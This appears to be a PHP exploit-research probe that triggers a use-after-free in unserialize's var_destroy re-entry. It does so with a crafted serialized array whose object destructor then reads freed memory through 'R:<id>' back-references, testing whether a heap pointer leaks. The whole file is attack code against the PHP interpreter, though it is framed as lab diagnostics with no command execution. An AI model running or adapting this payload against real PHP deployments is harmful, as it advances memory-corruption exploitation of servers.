<?php
/**
 * b2 — can the var_destroy re-entry UAF disclose a heap pointer by itself?
 *
 * The freed var_entries extension retains exactly one real pointer,
 * data[0] = &last_zval (measured in verify_vardestroy_nospray.php). This
 * probe tests whether the typed `R:<id>` reader can turn that pointer into
 * bytes we can read back, WITHOUT a reclaim spray (a spray would only echo
 * attacker-supplied bytes — no disclosure).
 *
 * It also measures the reader's reach: which ids resolve after the free, and
 * what type/value each returns. If every answer is a typed copy of an
 * element we supplied, the UAF has no native pointer-disclosure channel.
 *
 * Lab-only diagnostic. No command execution.
 */

$GLOBALS['OUT'] = [];

function note(string $k, $v): void {
    $GLOBALS['OUT'][] = $k . '=' . (is_scalar($v) ? (string)$v : gettype($v));
}

function dump(string $id): bool {
    $hint = @unserialize('N;');
    $r = @unserialize('R:' . $id . ';');
    $t = gettype($r);
    $line = "R:$id type=$t";
    if ($t === 'integer')  $line .= " val=$r";
    elseif ($t === 'string') $line .= " hex=" . bin2hex($r);
    elseif ($t === 'double')  $line .= " bits=" . bin2hex(pack('E', $r))
                                    . " val=$r";
    elseif ($t === 'NULL')    $line .= " (null)";
    else                      $line .= " (unintrospectable)";
    $GLOBALS['OUT'][] = $line;
    return true;
}

class T {
    public function __destruct() {
        /* the outer var_destroy has already freed the extension chunk.
         * Probe the typed reader across the boundary. */
        foreach ([0, 1, 1016, 1017, 1018, 1019, 1020, 1021, 2040] as $id) {
            @dump((string)$id);
        }
        /* Fresh nested call that does NOT touch the freed chain: proves the
         * reader is otherwise sane and the harness itself is not inventing
         * pointers. */
        $fresh = @unserialize('a:1:{i:0;d:1.0;}');
        $GLOBALS['OUT'][] = 'fresh=' . gettype($fresh);
    }
}

$N = 1016;
$p = 'a:' . ($N + 2) . ':{';
for ($i = 0; $i < $N; $i++) { $p .= 'i:0;N;'; }
/* last distinct elements: object then the duplicate-key scalar */
$p .= 'i:99999;O:1:"T":0:{}i:99999;i:4242;}';

@unserialize($p);

echo "=== b2 seed probe ===\n";
foreach ($GLOBALS['OUT'] as $line) { echo $line . "\n"; }
echo "=== end ===\n";
